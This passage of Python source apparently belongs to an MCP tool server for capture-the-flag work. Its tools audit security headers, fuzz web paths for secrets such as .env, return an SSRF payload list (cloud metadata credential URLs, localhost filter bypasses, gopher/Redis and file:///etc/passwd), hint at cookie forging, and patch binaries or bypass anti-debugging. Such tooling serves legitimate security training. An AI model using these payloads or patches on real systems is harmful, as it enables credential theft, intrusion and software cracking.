    h = {k.lower(): v for k, v in r.headers.items()}
    results = [f"Security header audit: {r.status_code} {url}\n"]
    checks = [
        ("content-security-policy",    lambda v: "unsafe-inline" in v or "unsafe-eval" in v,
         "CSP weak (unsafe-inline/eval present)", "MISSING CSP - XSS fully unmitigated"),
        ("strict-transport-security",  lambda v: "max-age" not in v.lower(),
         "HSTS missing max-age", "MISSING HSTS - HTTP downgrade possible"),
        ("x-frame-options",            lambda v: v.upper() not in ("DENY", "SAMEORIGIN"),
         "X-Frame-Options unexpected value", "MISSING X-Frame-Options - clickjacking possible"),
        ("x-content-type-options",     lambda v: v.lower() != "nosniff",
         "not 'nosniff'", "MISSING X-Content-Type-Options - MIME sniffing possible"),
        ("referrer-policy",            lambda v: "unsafe-url" in v.lower(),
         "Referrer-Policy leaks full URLs", "MISSING Referrer-Policy"),
        ("permissions-policy",         lambda _: False, "", "MISSING Permissions-Policy"),
    ]
    for name, is_weak, weak_msg, missing_msg in checks:
        val = h.get(name)
        if val is None:
            results.append(f"  - {missing_msg}")
        elif is_weak(val):
            results.append(f"  ~ {name}: {val!r}  [{weak_msg}]")
        else:
            results.append(f"  + {name}: {val!r}")
    set_cookies = [v for k, v in r.headers.items() if k.lower() == "set-cookie"]
    if set_cookies:
        results.append("\n=== Cookies ===")
        for ck in set_cookies:
            issues = []
            if "httponly" not in ck.lower(): issues.append("no HttpOnly")
            if "secure"   not in ck.lower(): issues.append("no Secure")
            if "samesite" not in ck.lower(): issues.append("no SameSite")
            mark = "~" if issues else "+"
            results.append(f"  {mark} {ck.split(';')[0]}  [{', '.join(issues)}]" if issues
                           else f"  {mark} {ck.split(';')[0]}")
    if "content-security-policy" in h:
        results.append(f"\n=== CSP detail ===\n  {h['content-security-policy']}")
        for d in h["content-security-policy"].split(";"):
            d = d.strip()
            if "unsafe-inline" in d: results.append(f"  ! unsafe-inline: {d}")
            if "unsafe-eval"   in d: results.append(f"  ! unsafe-eval:   {d}")
    return "\n".join(results)


@mcp.tool()
def web_path_fuzz(base_url: str, wordlist: str = "", extra_headers: str = "",
                  extensions: str = ".php .html .txt .bak .zip") -> str:
    """Brute-force common web paths to discover hidden endpoints and files.

    wordlist:   newline-separated paths (uses built-in list if empty).
    extensions: space-separated extensions to also try for each word.
    Returns all non-404 paths with status codes and response sizes.
    """
    import requests as _req, warnings
    from urllib.parse import urljoin
    warnings.filterwarnings("ignore")
    hdr = {"User-Agent": "Mozilla/5.0"}
    for line in extra_headers.splitlines():
        if ":" in line:
            k, _, v = line.partition(":")
            hdr[k.strip()] = v.strip()
    if not base_url.endswith("/"):
        base_url += "/"
    default_words = [
        "admin","administrator","login","dashboard","panel","manage","api","api/v1",
        "api/v2","graphql","swagger","swagger-ui.html","api-docs","openapi.json",
        "robots.txt","sitemap.xml",".git/HEAD",".env","config.php","config.yml",
        "config.json","settings.php","web.config","phpinfo.php","info.php","test.php",
        "debug.php","status","health","healthz","metrics","actuator","actuator/env",
        "server-status","backup","backup.zip","db.sql","dump.sql","upload","uploads",
        "files","static","assets","readme.md","README.md","wp-admin","wp-login.php",
        "wp-config.php","xmlrpc.php","phpmyadmin","adminer","console","shell",
        "flag","flag.txt","secret","secret.txt","key.txt",".htaccess",".htpasswd",
        ".DS_Store","/.well-known/security.txt",
    ]
    words = [w.strip() for w in wordlist.splitlines() if w.strip()] if wordlist else default_words
    exts  = [""] + extensions.split()
    results = [f"Path fuzz: {base_url}  ({len(words)} words x {len(exts)} ext variants)\n"]
    hits = []
    session = _req.Session()
    session.verify = False
    for word in words:
        for ext in exts:
            test_url = urljoin(base_url, f"{word}{ext}")
            try:
                r = session.get(test_url, headers=hdr, timeout=6, allow_redirects=False)
                if r.status_code not in (404, 400):
                    line = f"  {r.status_code}  {test_url}  ({len(r.content)} bytes)"
                    if r.status_code in (301, 302, 307):
                        line += f"  -> {r.headers.get('Location','')}"
                    hits.append(line)
            except Exception:
                pass
    results.append(
        f"Found {len(hits)} interesting path(s):\n" + "\n".join(hits) if hits
        else "[no interesting paths found]"
    )
    return "\n".join(results)


@mcp.tool()
def web_ssrf_payloads(current_value: str = "") -> str:
    """Return SSRF payloads: cloud metadata, internal services, protocol schemes, and filter bypasses."""
    return (
        "=== Cloud metadata ===\n"
        "http://169.254.169.254/latest/meta-data/                     # AWS IMDSv1\n"
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/\n"
        "http://metadata.google.internal/computeMetadata/v1/          # GCP (Metadata-Flavor: Google)\n"
        "http://169.254.169.254/metadata/v1/                          # DigitalOcean\n"
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01  # Azure\n\n"
        "=== Internal services ===\n"
        "http://127.0.0.1/  http://localhost/  http://0.0.0.0/  http://[::1]/\n"
        "http://127.0.0.1:22/    # SSH\n"
        "http://127.0.0.1:3306/  # MySQL\n"
        "http://127.0.0.1:5432/  # PostgreSQL\n"
        "http://127.0.0.1:6379/  # Redis\n"
        "http://127.0.0.1:2375/  # Docker daemon\n"
        "http://127.0.0.1:9200/  # Elasticsearch\n\n"
        "=== Filter bypasses ===\n"
        "http://2130706433/       # 127.0.0.1 decimal\n"
        "http://0x7f000001/       # 127.0.0.1 hex\n"
        "http://017700000001/     # 127.0.0.1 octal\n"
        "http://127.1/            # shorthand\n"
        "http://evil.com@127.0.0.1/   # userinfo bypass\n"
        "http://127.0.0.1#evil.com    # fragment\n"
        "dict://127.0.0.1:6379/       # Redis via dict://\n"
        "gopher://127.0.0.1:6379/     # Redis via gopher://\n"
        "file:///etc/passwd\n\n"
        "=== DNS rebinding ===\n"
        "Use: https://lock.cmpxchg8b.com/rebinder.html or rbndr.us\n"
        "First resolution -> allowed host; second -> 127.0.0.1"
        + (f"\n\nCurrent value: {current_value!r}" if current_value else "")
    )


@mcp.tool()
def web_cookie_decode(cookie_str: str) -> str:
    """Decode and identify a web session cookie format.

    Handles: JWT, Flask session (base64+zlib), PHP serialized, plain base64, hex, URL-encoding.
    Provides forging hints for each format.
    """
    import json, zlib
    results = [f"Cookie: {cookie_str[:80]}{'...' if len(cookie_str) > 80 else ''}"]
    # JWT detection
    if cookie_str.count(".") == 2 and all(
        re.fullmatch(r"[A-Za-z0-9\-_]+", p) for p in cookie_str.split(".")
    ):
        parts = cookie_str.split(".")
        def _bd(s):
            s += "=" * (-len(s) % 4)
            return json.loads(base64.urlsafe_b64decode(s))
        try:
            h = _bd(parts[0]); p = _bd(parts[1])
            results.append(f"\n=== JWT ===\nheader:  {json.dumps(h)}\npayload: {json.dumps(p)}")
            results.append("-> Run web_jwt_attacks() for full attack suite")
            return "\n".join(results)
        except Exception:
            pass
    # Flask session
    if cookie_str.startswith("."):
        try:
            part = cookie_str.lstrip(".").split(".")[0]
            padded = part + "=" * (-len(part) % 4)
            decoded = base64.urlsafe_b64decode(padded)
            try: obj = json.loads(zlib.decompress(decoded))
            except Exception: obj = json.loads(decoded)
            results.append(f"\n=== Flask session ===\n{json.dumps(obj, indent=2)}")
            results.append("-> flask-unsign --sign --cookie '{...}' --secret '<secret>'")
            return "\n".join(results)
        except Exception:
            pass
    # PHP serialized
    if re.match(r'^[aOsibNd]:', cookie_str):
        results.append(f"\n=== PHP serialized ===\n{cookie_str[:300]}")
        results.append("-> Check for __wakeup/__destruct gadgets for object injection")
        return "\n".join(results)
    # Base64
    try:
        padded = cookie_str + "=" * (-len(cookie_str) % 4)
        decoded = base64.b64decode(padded)
        try:
            text = json.loads(decoded)
            results.append(f"\n=== Base64 -> JSON ===\n{json.dumps(text, indent=2)}")
            return "\n".join(results)
        except Exception:
            text = decoded.decode("utf-8", errors="replace")
            if len(text) > 4:
                results.append(f"\n=== Base64 decoded ===\n{text[:500]}")
                return "\n".join(results)
    except Exception:
        pass
    # Hex
    cleaned = re.sub(r"\s|%", "", cookie_str)
    if re.fullmatch(r"[0-9a-fA-F]+", cleaned) and len(cleaned) % 2 == 0:
        results.append(f"\n=== Hex decoded ===\n{bytes.fromhex(cleaned).decode('utf-8', errors='replace')[:500]}")
        return "\n".join(results)
    # URL-encoded
    decoded_url = urllib.parse.unquote_plus(cookie_str)
    if decoded_url != cookie_str:
        results.append(f"\n=== URL-decoded ===\n{decoded_url[:500]}")
    else:
        results.append("\n[no known encoding detected - may be opaque/signed/encrypted]")
    return "\n".join(results)


# ---------------------------------------------------------------------------
# REVERSE ENGINEERING TOOLBOX
# ---------------------------------------------------------------------------

@mcp.tool()
def re_file_recon(path: str) -> str:
    """Full first-pass recon on any workspace file: magic bytes, entropy, strings preview,
    architecture hints, and packer/protector fingerprints.

    Combines file, readelf (ELF), objdump headers, entropy, and strings in one call —
    the single tool to run first on any unknown binary or blob.
    """
    import math
    target = _safe_path(path)
    out = []

    # file magic
    out.append("=== file ===")
    out.append(_run(["file", str(target)]))

    # entropy
    data = target.read_bytes()
    n = len(data)
    freq = [0] * 256
    for b in data: freq[b] += 1
    entropy = -sum((f/n)*math.log2(f/n) for f in freq if f) if n else 0
    rating = ("VERY HIGH - likely packed/encrypted" if entropy > 7.2
              else "HIGH - compressed or partially encrypted" if entropy > 6.5
              else "MEDIUM" if entropy > 4.0 else "LOW - plain text/data")
    out.append(f"\n=== Entropy ===\n{entropy:.4f} bits/byte  [{rating}]  size={n} bytes")

    # packer fingerprints
    out.append("\n=== Packer / protector fingerprints ===")
    packer_sigs = {
        b"UPX!":          "UPX packer",
        b"MPRESS":        "MPRESS packer",
        b"PECompact":     "PECompact",
        b"Themida":       "Themida/WinLicense",
        b".aspack":       "ASPack",
        b"FSG!":          "FSG packer",
        b"PySys_SetArgv": "PyInstaller bundle",
        b"PKG\x00":       "Python PKG archive (PyInstaller)",
        b"MEI\x0c\x0b\x0a\x0b\x0e": "PyInstaller MAGIC",
        b"java/lang":     "Java bytecode references",
        b".NET":          ".NET assembly",
        b"MSVBVM":        "Visual Basic runtime",
        b"Go build":      "Go binary",
        b"rust_panic":    "Rust binary",
    }
    found_packers = []
    for sig, label in packer_sigs.items():
        if sig in data[:65536]:
            found_packers.append(label)
    out.append("\n".join(f"  [!] {p}" for p in found_packers) if found_packers else "  none detected")

    # ELF section headers
    file_out = _run(["file", str(target)])
    if "ELF" in file_out:
        out.append("\n=== ELF section headers ===")
        out.append(_truncate(_run(["readelf", "-S", "--wide", str(target)]), 40))
        out.append("\n=== ELF dynamic section ===")
        out.append(_truncate(_run(["readelf", "-d", str(target)]), 30))

    # PE check via strings heuristic
    if data[:2] == b"MZ":
        out.append("\n=== PE binary detected ===")
        out.append(_truncate(_run(["strings", "-n", "6", str(target)]), 60))

    # strings preview
    out.append("\n=== Strings preview (min 6, first 60 lines) ===")
    out.append(_truncate(_run(["strings", "-n", "6", str(target)]), 60))

    return "\n".join(out)


@mcp.tool()
def re_disassemble_function(path: str, function_name: str = "main",
                            syntax: str = "intel", limit: int = 200) -> str:
    """Disassemble a specific function from a workspace ELF binary.

    function_name: symbol name to disassemble (default: main).
                   Use 'ALL' to dump the entire .text section.
    syntax:        intel (default) or att
    limit:         max lines of output
    """
    target = _safe_path(path)
    if function_name.upper() == "ALL":
        cmd = ["objdump", "-d", f"-M{syntax}", str(target)]
    else:
        cmd = ["objdump", "-d", f"-M{syntax}", f"--disassemble={function_name}", str(target)]
    out = _run(cmd)
    if "[not found" in out or "no symbols" in out.lower() or not out.strip():
        # fallback: grep from full disasm
        full = _run(["objdump", "-d", f"-M{syntax}", str(target)])
        lines = full.splitlines()
        start = None
        result = []
        for i, line in enumerate(lines):
            if f"<{function_name}" in line:
                start = i
            if start is not None:
                result.append(line)
                if i > start and re.match(r'^[0-9a-f]+ <', line):
                    break  # next function started
        out = "\n".join(result) if result else f"[function '{function_name}' not found in binary]"
    return _truncate(out, limit)


@mcp.tool()
def re_symbol_table(path: str, filter_str: str = "") -> str:
    """Dump the symbol table of a workspace binary (ELF, PE via strings heuristic).

    Shows function addresses, sizes, and types. Highlights interesting names
    (win, flag, secret, backdoor, admin, check, verify, license, serial).
    filter_str: optional substring to narrow results.
    """
    target = _safe_path(path)
    raw = _run(["readelf", "-W", "--syms", str(target)])
    if "[tool not installed" in raw:
        raw = _run(["nm", "-C", str(target)])

    interesting = {"win", "flag", "secret", "backdoor", "admin", "check",
                   "verify", "license", "serial", "auth", "password", "key",
                   "crack", "validate", "correct", "success", "unlock"}
    lines = []
    flagged = []
    for line in raw.splitlines():
        if filter_str and filter_str.lower() not in line.lower():
            continue
        lines.append(line)
        lower = line.lower()
        if any(k in lower for k in interesting):
            flagged.append(f"  [!] {line.strip()}")

    out = _truncate("\n".join(lines), 200)
    if flagged:
        out += "\n\n=== Interesting symbols ===\n" + "\n".join(flagged)
    return out


@mcp.tool()
def re_imports_exports(path: str) -> str:
    """List all imported and exported symbols of a workspace binary.

    For ELF: uses readelf --dyn-syms.
    Highlights dangerous libc calls and functions commonly targeted in CTF reversing
    (strcmp, strncmp, memcmp, system, puts, scanf, gets, rand, srand, time).
    """
    target = _safe_path(path)
    raw = _run(["readelf", "-W", "--dyn-syms", str(target)])

    dangerous    = {"gets","strcpy","strcat","sprintf","scanf","system","popen",
                    "execve","read","recv","memcpy"}
    ctf_relevant = {"strcmp","strncmp","memcmp","rand","srand","time","atoi",
                    "strtol","puts","printf","strlen","malloc","free"}

    imports, exports, danger_hits, ctf_hits = [], [], [], []
    for line in raw.splitlines():
        name = line.split()[-1].split("@")[0] if line.split() else ""
        if "UND" in line:
            imports.append(name)
            if name in dangerous:    danger_hits.append(name)
            if name in ctf_relevant: ctf_hits.append(name)
        elif "FUNC" in line and "UND" not in line:
            exports.append(name)

    lines = [
        f"=== Imports ({len(imports)}) ===",
        ", ".join(sorted(set(imports))),
        f"\n=== Exports ({len(exports)}) ===",
        ", ".join(sorted(set(exports))),
    ]
    if danger_hits:
        lines.append(f"\n=== Dangerous functions ===\n  " + ", ".join(sorted(set(danger_hits))))
    if ctf_hits:
        lines.append(f"\n=== CTF-relevant functions ===\n  " + ", ".join(sorted(set(ctf_hits))))
        if "strcmp" in ctf_hits or "strncmp" in ctf_hits or "memcmp" in ctf_hits:
            lines.append(
                "\n  Tip: strcmp/strncmp/memcmp are classic license-check targets.\n"
                "  Try: ltrace ./binary  to see arguments at runtime.\n"
                "  Or patch the comparison to always return 0."
            )
    return "\n".join(lines)


@mcp.tool()
def re_hex_view(path: str, offset: int = 0, length: int = 256) -> str:
    """Show a hex+ASCII dump of a workspace file at a given offset.

    offset: byte offset to start from (default 0).
    length: number of bytes to dump (default 256, max 4096).
    """
    target = _safe_path(path)
    length = min(length, 4096)
    data = target.read_bytes()
    chunk = data[offset:offset + length]
    if not chunk:
        return f"[offset {offset} is past end of file ({len(data)} bytes)]"

    lines = [f"Hex dump of {target.name} @ offset {offset} ({len(chunk)} bytes):\n"]
    for i in range(0, len(chunk), 16):
        row = chunk[i:i+16]
        hex_part  = " ".join(f"{b:02x}" for b in row)
        ascii_part = "".join(chr(b) if 32 <= b < 127 else "." for b in row)
        lines.append(f"  {offset+i:08x}  {hex_part:<47}  |{ascii_part}|")
    return "\n".join(lines)


@mcp.tool()
def re_patch_binary(path: str, offset: int, new_bytes_hex: str) -> str:
    """Patch bytes in a workspace binary by writing new_bytes_hex at the given offset.

    The patched file is written to /tmp/ctf/<filename>.patched and its path returned.
    Original file in /workspace is never modified (it is mounted read-only).

    offset:        byte offset (decimal or 0x-prefixed hex).
    new_bytes_hex: replacement bytes as hex string, e.g. "9090" for two NOPs.

    Common patches:
      jne -> je:   75 -> 74
      jne -> jmp:  75 -> eb
      call check -> nop nop nop nop nop: e8 xx xx xx xx -> 90 90 90 90 90
      strcmp ret always-0: patch return to xor eax,eax; ret = 31 c0 c3
    """
    target = _safe_path(path)
    new_bytes = bytes.fromhex(re.sub(r"\s", "", new_bytes_hex))
    data = bytearray(target.read_bytes())

    real_offset = int(offset) if isinstance(offset, int) else int(str(offset), 0)
    if real_offset + len(new_bytes) > len(data):
        return f"[patch exceeds file size: offset={real_offset} + {len(new_bytes)} > {len(data)}]"

    original = data[real_offset:real_offset + len(new_bytes)].hex()
    data[real_offset:real_offset + len(new_bytes)] = new_bytes

    SCRATCH.mkdir(parents=True, exist_ok=True)
    out_path = SCRATCH / f"{target.name}.patched"
    out_path.write_bytes(bytes(data))

    return (
        f"Patched: {target.name}\n"
        f"Offset:  0x{real_offset:x} ({real_offset})\n"
        f"Before:  {original}\n"
        f"After:   {new_bytes_hex.replace(' ','')}\n"
        f"Saved:   {out_path}\n\n"
        f"To run:  chmod +x {out_path} && {out_path}"
    )


@mcp.tool()
def re_find_strings_pattern(path: str, pattern: str,
                             min_length: int = 4, limit: int = 200) -> str:
    """Extract strings from a workspace binary and filter by a regex pattern.

    Useful for hunting: flags (HTB{, CTF{, flag{), URLs, IPs, error messages,
    hardcoded credentials, registry keys, and suspicious function names.

    pattern: Python regex to match against each extracted string.
    """
    target = _safe_path(path)
    raw = _run(["strings", "-n", str(min_length), str(target)])
    rx  = re.compile(pattern, re.IGNORECASE)
    hits = [line for line in raw.splitlines() if rx.search(line)]
    if not hits:
        return f"[no strings matched pattern {pattern!r}]"
    return _truncate(f"Matched {len(hits)} string(s) for pattern {pattern!r}:\n" +
                     "\n".join(f"  {h}" for h in hits), limit)


@mcp.tool()
def re_control_flow(path: str, function_name: str = "main", limit: int = 150) -> str:
    """Summarise the control flow of a function: branches, calls, loops, and comparisons.

    Parses objdump output to extract:
      - All CALL targets (direct and indirect)
      - All conditional/unconditional JMP targets
      - CMP/TEST instructions (often flag/key comparisons)
      - Potential loop back-edges

    Gives a high-level map before diving into full disassembly.
    """
    target = _safe_path(path)
    cmd = (["objdump", "-d", "-M", "intel", f"--disassemble={function_name}", str(target)]
           if function_name.upper() != "ALL"
           else ["objdump", "-d", "-M", "intel", str(target)])
    raw = _run(cmd)

    calls, jumps, cmps, loops = [], [], [], []
    prev_addr = None
    for line in raw.splitlines():
        m_addr = re.match(r'\s+([0-9a-f]+):\s+(?:[0-9a-f]{2} )+\s+(.*)', line)
        if not m_addr:
            continue
        addr   = int(m_addr.group(1), 16)
        instr  = m_addr.group(2).strip()
        mnemonic = instr.split()[0].lower() if instr.split() else ""
        operand  = instr[len(mnemonic):].strip()

        if mnemonic == "call":
            calls.append(f"  0x{addr:x}: call {operand}")
        elif mnemonic.startswith("j"):
            target_addr = operand.split()[0]
            try:
                t = int(target_addr, 16)
                if t < addr:
                    loops.append(f"  0x{addr:x}: {mnemonic} {operand}  <- BACK-EDGE (loop)")
                else:
                    jumps.append(f"  0x{addr:x}: {mnemonic} {operand}")
            except ValueError:
                jumps.append(f"  0x{addr:x}: {mnemonic} {operand}  (indirect)")
        elif mnemonic in ("cmp", "test"):
            cmps.append(f"  0x{addr:x}: {instr}")

    sections = [f"Control flow summary: {function_name}() in {target.name}\n"]
    if calls:
        sections.append(f"=== CALL targets ({len(calls)}) ===\n" + "\n".join(calls[:50]))
    if cmps:
        sections.append(f"\n=== CMP / TEST ({len(cmps)}) ===\n" + "\n".join(cmps[:50]))
    if loops:
        sections.append(f"\n=== Loop back-edges ({len(loops)}) ===\n" + "\n".join(loops[:20]))
    if jumps:
        sections.append(f"\n=== Conditional jumps ({len(jumps)}) ===\n" + "\n".join(jumps[:50]))
    if not (calls or cmps or loops or jumps):
        sections.append("[no control-flow instructions found — check function name or try 'ALL']")
    return _truncate("\n".join(sections), limit)


@mcp.tool()
def re_xref_string(path: str, search_string: str, limit: int = 100) -> str:
    """Find all binary addresses that reference a given string in a workspace ELF.

    Locates the string in the binary's data sections, then searches the disassembly
    for instructions that load its address (lea, mov with the offset).
    Useful for finding where a hardcoded password, flag, or message is compared.
    """
    target = _safe_path(path)
    data = target.read_bytes()
    needle = search_string.encode("utf-8")

    # Find all occurrences of string in binary
    offsets = []
    start = 0
    while True:
        idx = data.find(needle, start)
        if idx == -1:
            break
        offsets.append(idx)
        start = idx + 1

    if not offsets:
        return f"[string {search_string!r} not found in binary]"

    lines = [f"String {search_string!r} found at file offsets: {[hex(o) for o in offsets]}\n"]

    # Get base address from ELF to convert file offset -> VA
    readelf_out = _run(["readelf", "-S", "--wide", str(target)])
    # Find .rodata or .data section offset/addr mapping
    section_map = []
    for line in readelf_out.splitlines():
        m = re.search(r'\[\s*\d+\]\s+(\S+)\s+\S+\s+([0-9a-f]+)\s+([0-9a-f]+)\s+([0-9a-f]+)', line)
        if m:
            section_map.append({
                "name":  m.group(1),
                "vaddr": int(m.group(2), 16),
                "foff":  int(m.group(3), 16),
                "size":  int(m.group(4), 16),
            })

    for file_off in offsets:
        for sec in section_map:
            if sec["foff"] <= file_off < sec["foff"] + sec["size"]:
                va = sec["vaddr"] + (file_off - sec["foff"])
                lines.append(f"  File offset 0x{file_off:x} -> VA 0x{va:x}  (section {sec['name']})")
                # Search disassembly for this VA
                disasm = _run(["objdump", "-d", "-M", "intel", str(target)])
                xrefs = []
                for dline in disasm.splitlines():
                    if f"0x{va:x}" in dline.lower() or f"{va:x}" in dline.lower():
                        xrefs.append(f"    {dline.strip()}")
                if xrefs:
                    lines.append(f"  Xrefs (instructions referencing 0x{va:x}):")
                    lines.extend(xrefs[:20])
                break

    return _truncate("\n".join(lines), limit)


@mcp.tool()
def re_decompile_hint(path: str, function_name: str = "main") -> str:
    """Produce a pseudo-C decompilation hint for a workspace ELF function.

    Uses objdump + pattern matching to lift common idioms into readable C-like pseudocode:
    stack frame setup, local variables, comparisons, calls, branches, and return values.
    Not a full decompiler — use Ghidra/IDA for complex functions — but fast for simple checks.
    """
    target = _safe_path(path)
    cmd = ["objdump", "-d", "-M", "intel", f"--disassemble={function_name}", str(target)]
    raw = _run(cmd)
    if not raw.strip() or "no symbols" in raw.lower():
        return f"[function '{function_name}' not found — check re_symbol_table first]"

    lines = raw.splitlines()
    pseudo = [f"// Pseudo-C for {function_name}() in {target.name}",
              f"// (auto-lifted from objdump — verify with Ghidra/IDA)",
              f"",
              f"int {function_name}(...) {{"]

    local_vars: dict[str, str] = {}
    var_counter = 0
    calls_seen  = []
    ret_vals    = []

    for line in lines:
        m = re.match(r'\s+([0-9a-f]+):\s+(?:[0-9a-f]{2} )+\s+(.*)', line)
        if not m:
            continue
        instr    = m.group(2).strip()
        parts    = instr.split(None, 1)
        mnemonic = parts[0].lower() if parts else ""
        operand  = parts[1] if len(parts) > 1 else ""

        # Stack variable assignments
        mv = re.match(r'mov\s+(?:DWORD|QWORD|WORD|BYTE)?\s*PTR\s*\[rbp[+-](0x[0-9a-f]+)\],\s*(\S+)', instr, re.I)
        if mv:
            slot, src = mv.group(1), mv.group(2)
            if slot not in local_vars:
                var_counter += 1
                local_vars[slot] = f"var_{var_counter}"
            pseudo.append(f"    {local_vars[slot]} = {src};")
            continue

        # Stack variable reads
        mr = re.match(r'mov\s+(\w+),\s*(?:DWORD|QWORD|WORD|BYTE)?\s*PTR\s*\[rbp[+-](0x[0-9a-f]+)\]', instr, re.I)
        if mr:
            dst, slot = mr.group(1), mr.group(2)
            var = local_vars.get(slot, f"var_@{slot}")
            pseudo.append(f"    {dst} = {var};")
            continue

        # Comparisons
        cmp_m = re.match(r'(cmp|test)\s+(.*)', instr, re.I)
        if cmp_m:
            pseudo.append(f"    /* cmp {cmp_m.group(2)} */")
            continue

        # Calls
        call_m = re.match(r'call\s+(.*)', instr, re.I)
        if call_m:
            target_str = call_m.group(1).strip()
            name_m = re.search(r'<([^>]+)>', target_str)
            fname = name_m.group(1) if name_m else target_str
            fname = fname.split("@plt")[0].split("+")[0]
            calls_seen.append(fname)
            pseudo.append(f"    {fname}(...);")
            continue

        # Conditional jumps -> if
        jcc_m = re.match(r'(j[a-z]+)\s+(0x[0-9a-f]+)', instr, re.I)
        if jcc_m:
            mne, addr = jcc_m.group(1).lower(), jcc_m.group(2)
            inv = {"je":"!=","jne":"==","jl":">=","jg":"<=","jle":">","jge":"<",
                   "ja":"<=","jb":">=","jz":"!=","jnz":"=="}.get(mne, f"/* {mne} */")
            pseudo.append(f"    if (result {inv} 0) goto {addr};")
            continue

        # Return value
        if mnemonic in ("ret", "retn"):
            pseudo.append(f"    return eax;  // rax")
            continue

        # xor reg, reg -> zeroing
        xor_m = re.match(r'xor\s+(\w+),\s*\1', instr, re.I)
        if xor_m:
            pseudo.append(f"    {xor_m.group(1)} = 0;")
            continue

        # lea
        lea_m = re.match(r'lea\s+(\w+),\s*(.*)', instr, re.I)
        if lea_m:
            pseudo.append(f"    {lea_m.group(1)} = &({lea_m.group(2)});")
            continue

    pseudo.append("}")
    if calls_seen:
        pseudo.append(f"\n// Functions called: {', '.join(sorted(set(calls_seen)))}")

    return "\n".join(pseudo)


@mcp.tool()
def re_anti_debug_detect(path: str) -> str:
    """Scan a workspace binary for common anti-debugging and anti-analysis techniques.

    Checks for: ptrace self-calls, /proc/self checks, timing attacks (rdtsc, clock_gettime),
    IsDebuggerPresent (Windows), checksum/integrity self-checks, VM detection strings,
    obfuscation markers, and signal handlers used to detect tracing.
    """
    target = _safe_path(path)
    data  = target.read_bytes()
    strs  = _run(["strings", "-n", "4", str(target)])
    disasm = _run(["objdump", "-d", "-M", "intel", str(target)])

    findings = []

    string_sigs = [
        (b"ptrace",              "ptrace() call — classic anti-debug (returns -1 under debugger)"),
        (b"PTRACE_TRACEME",      "PTRACE_TRACEME — binary ptrace-traces itself"),
        (b"/proc/self/status",   "/proc/self/status — checks TracerPid field"),
        (b"/proc/self/maps",     "/proc/self/maps — memory map inspection"),
        (b"TracerPid",           "TracerPid string — direct /proc anti-debug"),
        (b"IsDebuggerPresent",   "Windows IsDebuggerPresent()"),
        (b"CheckRemoteDebuggerPresent", "Windows CheckRemoteDebuggerPresent()"),
        (b"NtQueryInformationProcess",  "Windows NtQueryInformationProcess — debug flag check"),
        (b"OutputDebugString",   "Windows OutputDebugString timing trick"),
        (b"VirtualBox",          "VirtualBox VM detection string"),
        (b"VMware",              "VMware VM detection string"),
        (b"VBOX",                "VirtualBox VM detection string"),
        (b"QEMU",                "QEMU VM detection string"),
        (b"Xen",                 "Xen hypervisor detection"),
        (b"SbieSelf",            "Sandboxie detection"),
        (b"cpuid",               "CPUID — hypervisor bit check"),
        (b"GetTickCount",        "GetTickCount — timing-based anti-debug"),
        (b"timeGetTime",         "timeGetTime — timing check"),
        (b"self_crc",            "Self-integrity / CRC check"),
        (b"anti_debug",          "Explicit anti_debug symbol"),
    ]

    for sig, label in string_sigs:
        if sig.lower() in data.lower():
            findings.append(f"  [STRING] {label}")

    # Disassembly patterns
    disasm_sigs = [
        (r'\brdtsc\b',           "rdtsc — read timestamp counter (timing attack)"),
        (r'int\s+3',             "int3 — software breakpoint trap"),
        (r'int\s+0x3',           "int3 (hex) — software breakpoint trap"),
        (r'0xcc',                "0xCC byte — INT3 opcode scan (looks for debugger patches)"),
        (r'call.*ptrace',        "ptrace call in disassembly"),
        (r'syscall.*kill',       "kill() syscall — may send SIGTRAP to self"),
        (r'ud2',                 "UD2 — undefined instruction trap"),
        (r'icebp',               "ICEBP (F1) — single-step trap"),
    ]
    for pattern, label in disasm_sigs:
        if re.search(pattern, disasm, re.IGNORECASE):
            findings.append(f"  [ASM]    {label}")

    # Signal handler check
    if b"SIGTRAP" in data or b"signal" in data:
        findings.append("  [STRING] SIGTRAP/signal handler — may catch debugger-injected traps")

    if not findings:
        return "[no anti-debug / anti-analysis techniques detected]"

    bypass_tips = [
        "\n=== Bypass tips ===",
        "  ptrace:            patch call to ptrace (e8 xx xx xx xx) with NOPs",
        "  /proc/self/status: use LD_PRELOAD hook or patch string to /dev/null",
        "  rdtsc timing:      patch rdtsc with 'xor eax,eax; xor edx,edx; nop'",
        "  int3 traps:        run under GDB with 'handle SIGTRAP nostop noprint'",
        "  IsDebuggerPresent: patch return to xor eax,eax; ret  (always returns 0)",
        "  VM detection:      run natively or patch CPUID handler",
    ]
    return (
        f"Anti-debug / anti-analysis findings in {target.name} ({len(findings)} hit(s)):\n"
        + "\n".join(findings)
        + "\n".join(bypass_tips)
    )


@mcp.tool()
def re_golang_binary(path: str) -> str:
    """Extract Go-specific metadata from a workspace Go binary.

    Recovers: Go version, build info, module path, function names (goroutines),
    and type strings — all stripped from the binary's embedded metadata sections.
    Useful because Go binaries statically link everything and strip poorly.
    """
    target = _safe_path(path)
    data = target.read_bytes()

    out = []

    # Go version string
    go_ver = re.search(rb'go1\.\d+(?:\.\d+)?(?:beta\d+|rc\d+)?', data)
    out.append(f"Go version: {go_ver.group().decode() if go_ver else 'not found'}")

    # Build info
    build_info = re.search(rb'\xff Go buildinf:', data)
    if build_info:
        chunk = data[build_info.start():build_info.start()+512]
        out.append(f"Build info block at offset 0x{build_info.start():x}")
        try:
            out.append(chunk.decode("utf-8", errors="replace")[:200])
        except Exception:
            pass

    # Module path from strings
    strs = _run(["strings", "-n", "8", str(target)])
    modules = [s for s in strs.splitlines() if s.startswith("go/") or "/" in s and "." in s and len(s) < 80]
    if modules:
        out.append(f"\n=== Module / import paths (sample) ===")
        out.extend(modules[:40])

    # Function names
    go_funcs = [s for s in strs.splitlines()
                if re.match(r'^[a-zA-Z0-9_/]+\.[A-Z][a-zA-Z0-9_]*$', s)]
    if go_funcs:
        out.append(f"\n=== Exported Go functions ({len(go_funcs)}) ===")
        out.extend(go_funcs[:60])

    # Type strings
    type_strs = [s for s in strs.splitlines() if s.startswith("type:") or s.startswith("go.type")]
    if type_strs:
        out.append(f"\n=== Type strings ({len(type_strs)}) ===")
        out.extend(type_strs[:30])

    return _truncate("\n".join(out), 200)


@mcp.tool()
def re_python_pyc(path: str) -> str:
    """Decompile or inspect a Python .pyc / .pyo bytecode file from the workspace.

    Shows: magic number (Python version), timestamp, code object constants and names,
    and attempts decompilation via uncompyle6/decompile3 if installed.
    Falls back to dis-style opcode listing via Python's dis module.
    """
    import dis, marshal, struct, io
